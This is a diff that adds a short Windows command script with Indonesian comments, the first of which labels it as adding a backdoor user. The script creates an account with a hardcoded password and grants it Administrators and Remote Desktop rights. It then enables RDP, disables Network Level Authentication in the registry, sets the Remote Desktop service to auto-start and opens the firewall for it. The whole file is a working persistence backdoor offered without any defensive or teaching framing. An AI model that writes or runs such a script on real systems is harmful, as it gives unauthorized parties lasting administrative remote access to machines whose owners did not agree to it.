@@ -1,0 +1,14 @@
+# 1. Tambah user backdoor
+net user testing123 PasswordCanggih123 /add
+net localgroup Administrators testing123 /add
+net localgroup "Remote Desktop Users" testing123 /add
+
+# 2. Aktifkan Fitur RDP di Registry
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+# 3. Pastikan Service RDP Bawaan Windows Aktif & Auto-Start
+# (Ini penting agar port 3389 selalu terbuka di sistem - untuk lokasi spesifix sc.exe ada pada folder system32)
+sc.exe config TermService start= auto
+sc.exe start TermService
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
